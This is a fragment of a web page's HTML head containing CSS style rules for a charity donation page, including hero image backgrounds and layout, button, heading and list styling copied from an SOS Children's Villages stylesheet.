        .node-3450f823-7fc9-4d6e-a789-719ef43654a7-par-top-section_control_copy_1003715759-column-parsys-1-heroimage .hero-image-container {
            background: url('/content/dam/redcross/donations/donate-forms/heros/OregonWF20_volunteers-with-client_1348x500.jpg.transform/1024/q70/feature/image.jpeg') center center / cover no-repeat;
        }
    }
</style>
                                            <style>
                                                @media (max-width: 767px) {
        .node-3450f823-7fc9-4d6e-a789-719ef43654a7-par-top-section_control_copy_1003715759-column-parsys-1-heroimage .hero-image-container {
            background: url('/content/dam/redcross/donations/donate-forms/heros/OregonWF20_volunteers-with-client_767x320.jpg.transform/768/q70/feature/image.jpeg') center center / cover no-repeat;
        }
    }
</style>
<style>
    
                /*! CSS Used from: https://www.sos-usa.org/App_Themes/sos/styles/sos.min.css?v=20220926-1142 */
.grid{display:grid;align-items:start;grid-template-columns:repeat(12,1fr);grid-column-gap:2rem;}
@media only screen and (max-width:767px){
.grid{grid-column-gap:1.5rem;}
}
@media (max-width:435px){
.grid{grid-column-gap:0;}
}
.grid>*{grid-column-end:span 12;}
.container-inner,.container-outer .container-inner{margin-left:auto!important;margin-right:auto!important;}
@media only screen and (max-width:767px){
.container-inner,.container-outer .container-inner{width:100%;padding-left:15px;padding-right:15px;}
}
@media (min-width:768px){
.container-inner,.container-outer .container-inner{width:720px;}
}
@media (min-width:992px){
.container-inner,.container-outer .container-inner{width:940px;}
}
@media (min-width:1200px){
.container-inner,.container-outer .container-inner{width:1140px;}
}
@media (min-width:1640px){
.container-inner,.container-outer .container-inner{width:1140px;}
}
.container-outer{width:100%;}
@media only screen and (max-width:767px){
.container-outer{min-width:100%;}
}
.container-outer:not(.full-width){max-width:2560px;margin:0 auto;}
.col-xs-12{grid-column-end:span 12;}
@media only screen and (min-width:768px){
.col-sm-12{grid-column-end:span 12;}
}
@media only screen and (min-width:1200px){
.col-lg-12{grid-column-end:span 12;}
}
@media only screen and (min-width:1200px){
.col-lg-12{grid-column-start:unset;}
}
[class*=col-]{position:relative;}
.bs-grid{position:relative;}
main{display:block;}
a{background-color:transparent;}
a:active,a:hover{outline:0;}
strong{font-weight:700;}
h1{font-size:2em;margin:.67em 0;}
img{border:0;}
*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;}
:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;}
a{color:#337ab7;text-decoration:none;}
a:focus,a:hover{color:#23527c;text-decoration:underline;}
a:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px;}
img{vertical-align:middle;}
h1,h2,h3{font-family:inherit;font-weight:500;line-height:1.1;color:inherit;}
h1,h2,h3{margin-top:20px;margin-bottom:10px;}
h1{font-size:3.052rem;}
h2{font-size:1.75rem;}
h3{font-size:2rem;}
p{margin:0 0 10px;}
ul{margin-top:0;margin-bottom:10px;}
.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:14px;line-height:1.42857143;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;}
.btn:active:focus,.btn:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px;}
.btn:focus,.btn:hover{color:#333;text-decoration:none;}
.btn:active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);-moz-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125);}
h1,h2,h3{font-weight:700;letter-spacing:0;color:var(--font-color-dark);margin-top:0;}
h1{font-size:44.79px;line-height:130%;margin-bottom:20px;}
@media only screen and (min-width:768px) and (max-width:1199px){
h1{font-size:39.81px;}
}
@media only screen and (max-width:767px){
h1{font-size:39.81px;}
}
h2{font-size:37.32px;line-height:120%;margin-bottom:15px;}
@media only screen and (min-width:768px) and (max-width:1199px){
h2{font-size:33.18px;}
}
@media only screen and (max-width:767px){
h2{font-size:33.18px;}
}
h3{font-size:31.1px;line-height:120%;margin-bottom:10px;}
@media only screen and (min-width:768px) and (max-width:1199px){
h3{font-size:27.65px;}
}
@media only screen and (max-width:767px){
h3{font-size:27.65px;}
}
.blue{color:#009ee0!important;}
.white{color:#fff!important;}
@media only screen and (max-width:1199px){
main{position:relative;}
}
ul:not(.cke_panel_list,.nav,.info,.CMSSiteMapList,.swiper-pagination-bullets){list-style:none!important;padding-inline-start:18px;position:relative;overflow:auto;}
ul:not(.cke_panel_list,.nav,.info,.CMSSiteMapList,.swiper-pagination-bullets) li:before{font-family:'Font Awesome 5 Free';content:'\f111'!important;color:var(--primary);font-size:8px;vertical-align:top;position:absolute;left:0;}
ul:not(.cke_panel_list,.nav,.info,.CMSSiteMapList,.swiper-pagination-bullets).arrow-list li:before{content:"\f061"!important;font-size:75%;}
ul:not(.cke_panel_list,.nav,.info,.CMSSiteMapList,.swiper-pagination-bullets).square-bullet-list li:before{content:"\f0c8"!important;font-size:75%;}
a{color:var(--primary);-webkit-transition:all .2s ease-out;-moz-transition:all .2s ease-out;-o-transition:all .2s ease-out;transition:all .2s ease-out;}
a:focus,a:hover{color:var(--primary);text-decoration:underline;}
img{max-width:100%;}
img.has-dimension-attributes{height:auto!important;}
.white-background{background-color:#fff!important;display:inline-flex;padding-left:15px;padding-right:15px;}
.primary-background{background-color:#009EE0!important;display:inline-flex;padding-left:15px;padding-right:15px;}
.box-padding{padding:calc(14px + 3.2%) calc(14px + 4.2%);}
.box-border{border:1px solid #e4e9f2;border-bottom-width:2px;border-radius:3px;}
.margin-top-small{margin-top:40px!important;}
@media only screen and (max-width:767px){
.margin-top-small{margin-top:20px!important;}
}
.margin-bottom-small{margin-bottom:40px!important;}
@media only screen and (max-width:767px){
.margin-bottom-small{margin-bottom:20px!important;}
}
.staticHTML-wrapper{overflow:hidden;}
.container-outer{max-width:1920px;}
.btn{color:#fff!important;background:#009EE0!important;padding:11px 20px 13px;margin:15px 0;font-weight:700;font-size:14px;letter-spacing:.02em;text-shadow:none;-webkit-font-smoothing:antialiased;border:none;text-transform:uppercase;text-decoration:none!important;white-space:initial;-webkit-transition:all .2s ease-out;-moz-transition:all .2s ease-out;-o-transition:all .2s ease-out;transition:all .2s ease-out;border-radius:3px;-webkit-box-shadow:inset 0 -2px 0 rgba(0,0,0,.15);-moz-box-shadow:inset 0 -2px 0 rgba(0,0,0,.15);box-shadow:inset 0 -2px 0 rgba(0,0,0,.15);}
.btn:active,.btn:focus,.btn:hover{background:#006893!important;}
.btn.btn-large{padding:14px 26px 16px;font-size:15px;}
.btn-blue{background-color:#009EE0!important;}
.btn-blue:active,.btn-blue:focus,.btn-blue:hover{background:#006893!important;text-decoration:none!important;}
.btn-green{background-color:#76B856!important;}
.btn-green:active,.btn-green:focus,.btn-green:hover{background:#538839!important;text-decoration:none!important;}
.btn-white{background-color:#fff!important;background:#fff!important;color:#009EE0!important;border:1px solid #d9d9d9;border-bottom:0;}
.btn-white:active,.btn-white:focus,.btn-white:hover{color:#454B41!important;background:#d9d9d9!important;text-decoration:none!important;}
/*! CSS Used from: https://www.sos-usa.org/App_Themes/sos/styles/sos-below.min.css?v=20220926-1142 */
.bg-light-grey{--font-color:#606a6f;--font-color-dark:#454B41;--primary:#009EE0;color:var(--font-color);background-color:#F5F7FA;}
.bg-sos-blue{--font-color:white;--font-color-dark:white;--primary:white;color:var(--font-color);background-color:#009EE0;}
.bg-sos-blue a:not(.btn){text-decoration:underline;}
.box-border.bg-sos-blue{border-color:#008cc7;}
.bg-image-wrapper{max-width:1920px;margin:0 auto;background-position:center!important;background-size:cover!important;background-repeat:no-repeat!important;}
.btn{color:#fff!important;background:#009EE0!important;padding:11px 20px 13px;margin:15px 0;font-weight:700;font-size:14px;letter-spacing:.02em;text-shadow:none;-webkit-font-smoothing:antialiased;border:none;text-transform:uppercase;text-decoration:none!important;white-space:initial;-webkit-transition:all .2s ease-out;-moz-transition:all .2s ease-out;-o-transition:all .2s ease-out;transition:all .2s ease-out;border-radius:3px;-webkit-box-shadow:inset 0 -2px 0 rgba(0,0,0,.15);-moz-box-shadow:inset 0 -2px 0 rgba(0,0,0,.15);box-shadow:inset 0 -2px 0 rgba(0,0,0,.15);}
.btn:active,.btn:focus,.btn:hover{background:#006893!important;}
.btn.btn-large{padding:14px 26px 16px;font-size:15px;}
.btn-blue{background-color:#009EE0!important;}
.btn-blue:active,.btn-blue:focus,.btn-blue:hover{background:#006893!important;text-decoration:none!important;}
.btn-green{background-color:#76B856!important;}
.btn-green:active,.btn-green:focus,.btn-green:hover{background:#538839!important;text-decoration:none!important;}
.btn-white{background-color:#fff!important;background:#fff!important;color:#009EE0!important;border:1px solid #d9d9d9;border-bottom:0;}
.btn-white:active,.btn-white:focus,.btn-white:hover{color:#454B41!important;background:#d9d9d9!important;text-decoration:none!important;}
h1,h2,h3{font-weight:700;letter-spacing:0;color:var(--font-color-dark);margin-top:0;}
h1{font-size:44.79px;line-height:130%;margin-bottom:20px;}
@media only screen and (min-width:768px) and (max-width:1199px){
h1{font-size:39.81px;}
}
@media only screen and (max-width:767px){
h1{font-size:39.81px;}
}
h2{font-size:37.32px;line-height:120%;margin-bottom:15px;}
@media only screen and (min-width:768px) and (max-width:1199px){
h2{font-size:33.18px;}
}
@media only screen and (max-width:767px){
h2{font-size:33.18px;}
}
h3{font-size:31.1px;line-height:120%;margin-bottom:10px;}
@media only screen and (min-width:768px) and (max-width:1199px){
h3{font-size:27.65px;}
}
@media only screen and (max-width:767px){
h3{font-size:27.65px;}
}
.blue{color:#009ee0!important;}
.white{color:#fff!important;}
@media only screen and (max-width:1199px){
main{position:relative;}
}
ul:not(.cke_panel_list,.nav,.info,.CMSSiteMapList,.swiper-pagination-bullets){list-style:none!important;padding-inline-start:18px;position:relative;overflow:auto;}
ul:not(.cke_panel_list,.nav,.info,.CMSSiteMapList,.swiper-pagination-bullets) li:before{font-family:'Font Awesome 5 Free';content:'\f111'!important;color:var(--primary);font-size:8px;vertical-align:top;position:absolute;left:0;}
ul:not(.cke_panel_list,.nav,.info,.CMSSiteMapList,.swiper-pagination-bullets).arrow-list li:before{content:"\f061"!important;font-size:75%;}
ul:not(.cke_panel_list,.nav,.info,.CMSSiteMapList,.swiper-pagination-bullets).square-bullet-list li:before{content:"\f0c8"!important;font-size:75%;}
a{color:var(--primary);-webkit-transition:all .2s ease-out;-moz-transition:all .2s ease-out;-o-transition:all .2s ease-out;transition:all .2s ease-out;}
a:focus,a:hover{color:var(--primary);text-decoration:underline;}
img{max-width:100%;}
img.has-dimension-attributes{height:auto!important;}
.white-background{background-color:#fff!important;display:inline-flex;padding-left:15px;padding-right:15px;}
.primary-background{background-color:#009EE0!important;display:inline-flex;padding-left:15px;padding-right:15px;}
.box-padding{padding:calc(14px + 3.2%) calc(14px + 4.2%);}
.box-border{border:1px solid #e4e9f2;border-bottom-width:2px;border-radius:3px;}
.image-credits-wrapper{position:relative!important;display:inline-block;width:100%;}
.image-credits-wrapper .image-credits{position:absolute;bottom:0;right:0;z-index:1000;display:flex;flex-direction:row;align-items:flex-end;}
.image-credits-wrapper .image-credits .image-credits-text{padding:5px;background-color:rgba(0,0,0,.5);box-shadow:0 0 15px 2px rgba(0,0,0,.31);color:#fff;font-size:15px;line-height:1.2;}
.image-credits-wrapper .image-credits .image-credits-text.credits-hidden{display:none;}
.image-credits-wrapper .image-credits img.image-credits-button{width:25px;height:20px;margin:0 13px 13px 10px;padding:1px;opacity:.6;transition:opacity .3s ease-in-out;cursor:pointer;}
.image-credits-wrapper .image-credits img.image-credits-button:hover{opacity:1;}
.lozad{min-width:1px;min-height:1px;}

.bs-grid p{
        font-size: 18px;
    }

    .square-bullet-list .arrow-list li{
        font-size: 18px;
    }
</style>


</head>
